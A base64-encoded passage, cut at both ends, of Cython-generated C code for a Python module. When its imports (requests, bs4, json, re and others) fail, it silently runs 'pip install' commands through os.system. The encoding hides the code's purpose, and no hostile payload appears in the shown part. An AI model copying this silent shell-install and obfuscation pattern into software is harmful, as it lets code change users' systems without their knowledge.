weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N5c3RlbSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAxNSwgX19weXhfTDRfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgIF9fcHl4X3RfNiA9IDE7XG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfcGlwX2luc3RhbGxfcHl0aG9uX2Nmb250c307XG4gICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTEsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTUsIF9fcHl4X0w0X2V4Y2VwdF9lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICB9XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgIGdvdG8gX19weXhfTDNfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgfVxuXG4gICAgXG4gICAgX19weXhfTDRfZXhjZXB0X2Vycm9yOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfNywgX19weXhfdF84KTtcbiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgIF9fcHl4X0wzX2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfNywgX19weXhfdF84KTtcbiAgICBfX3B5eF9MN190cnlfZW5kOjtcbiAgfVxuXG4gIFxuICB7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzgsICZfX3B5eF90XzcsICZfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpO1xuICAgICB7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8yID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDE3LCBfX3B5eF9MMTBfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVxdWVzdHMsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAxNywgX19weXhfTDEwX2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG5cbiAgICAgIFxuICAgIH1cbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICBnb3RvIF9fcHl4X0wxNV90cnlfZW5kO1xuICAgIF9fcHl4X0wxMF9lcnJvcjo7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcblxuICAgIFxuICAgICB7XG4gICAgICBfX1B5eF9BZGRUcmFjZWJhY2soIm9wIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzIsICZfX3B5eF90XzMsICZfX3B5eF90XzUpIDwgMCkgX19QWVhfRVJSKDAsIDE4LCBfX3B5eF9MMTJfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMTEgPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDE5LCBfX3B5eF9MMTJfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7XG4gICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXN0ZW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMTksIF9fcHl4X0wxMl9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcbiAgICAgIF9fcHl4X3RfNiA9IDE7XG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3BpcF9pbnN0YWxsX3JlcXVlc3RzfTtcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDE5LCBfX3B5eF9MMTJfZXhjZXB0X2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIH1cbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgZ290byBfX3B5eF9MMTFfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgfVxuXG4gICAgXG4gICAgX19weXhfTDEyX2V4Y2VwdF9lcnJvcjo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF84LCBfX3B5eF90XzcsIF9fcHl4X3RfMSk7XG4gICAgZ290byBfX3B5eF9MMV9lcnJvcjtcbiAgICBfX3B5eF9MMTFfZXhjZXB0aW9uX2hhbmRsZWQ6O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOCwgX19weXhfdF83LCBfX3B5eF90XzEpO1xuICAgIF9fcHl4X0wxNV90cnlfZW5kOjtcbiAgfVxuXG4gIFxuICB7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzEsICZfX3B5eF90XzcsICZfX3B5eF90XzgpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpO1xuICAgICB7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF81ID0gX19QeXhfUHlMaXN0X1BhY2soMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0JlYXV0aWZ1bFNvdXApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAyMSwgX19weXhfTDE4X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JzNCwgX19weXhfdF81LCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMjEsIF9fcHl4X0wxOF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9JbXBvcnRGcm9tKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0JlYXV0aWZ1bFNvdXApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAyMSwgX19weXhfTDE4X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0JlYXV0aWZ1bFNvdXAsIF9fcHl4X3RfNSkgPCAoMCkpIF9fUFlYX0VSUigwLCAyMSwgX19weXhfTDE4X2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICAgICAgXG4gICAgfVxuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgIGdvdG8gX19weXhfTDIzX3RyeV9lbmQ7XG4gICAgX19weXhfTDE4X2Vycm9yOjtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuXG4gICAgXG4gICAgIHtcbiAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygib3AiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMywgJl9fcHl4X3RfNSwgJl9fcHl4X3RfMikgPCAwKSBfX1BZWF9FUlIoMCwgMjIsIF9fcHl4X0wyMF9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8xMCA9IE5VTEw7XG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAyMywgX19weXhfTDIwX2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTtcbiAgICAgIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N5c3RlbSk7IGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDIzLCBfX3B5eF9MMjBfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgX19weXhfdF82ID0gMTtcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfcGlwX2luc3RhbGxfYnM0fTtcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF85LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIzLCBfX3B5eF9MMjBfZXhjZXB0X2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIH1cbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgZ290byBfX3B5eF9MMTlfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgfVxuXG4gICAgXG4gICAgX19weXhfTDIwX2V4Y2VwdF9lcnJvcjo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzcsIF9fcHl4X3RfOCk7XG4gICAgZ290byBfX3B5eF9MMV9lcnJvcjtcbiAgICBfX3B5eF9MMTlfZXhjZXB0aW9uX2hhbmRsZWQ6O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF83LCBfX3B5eF90XzgpO1xuICAgIF9fcHl4X0wyM190cnlfZW5kOjtcbiAgfVxuXG4gIFxuICB7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzgsICZfX3B5eF90XzcsICZfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpO1xuICAgICB7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8yID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9qc29uLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMjUsIF9fcHl4X0wyNl9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9qc29uLCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjUsIF9fcHl4X0wyNl9lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmUsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAyNiwgX19weXhfTDI2X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlLCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjYsIF9fcHl4X0wyNl9lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAyNywgX19weXhfTDI2X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zLCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjcsIF9fcHl4X0wyNl9lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMjgsIF9fcHl4X0wyNl9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXMsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAyOCwgX19weXhfTDI2X2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG5cbiAgICAgIFxuICAgIH1cbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICBnb3RvIF9fcHl4X0wzMV90cnlfZW5kO1xuICAgIF9fcHl4X0wyNl9lcnJvcjo7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcblxuICAgIFxuICAgICB7XG4gICAgICBfX1B5eF9BZGRUcmFjZWJhY2soIm9wIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzIsICZfX3B5eF90XzUsICZfX3B5eF90XzMpIDwgMCkgX19QWVhfRVJSKDAsIDI5LCBfX3B5eF9MMjhfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfOSA9IE5VTEw7XG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzMCwgX19weXhfTDI4X2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXN0ZW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgMzAsIF9fcHl4X0wyOF9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgX19weXhfdF82ID0gMTtcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9waXBfaW5zdGFsbF9qc29ufTtcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAzMCwgX19weXhfTDI4X2V4Y2VwdF9lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICB9XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgIGdvdG8gX19weXhfTDI3X2V4Y2VwdGlvbl9oYW5kbGVkO1xuICAgIH1cblxuICAgIFxuICAgIF9fcHl4X0wyOF9leGNlcHRfZXJyb3I6O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOCwgX19weXhfdF83LCBfX3B5eF90XzEpO1xuICAgIGdvdG8gX19weXhfTDFfZXJyb3I7XG4gICAgX19weXhfTDI3X2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90Xz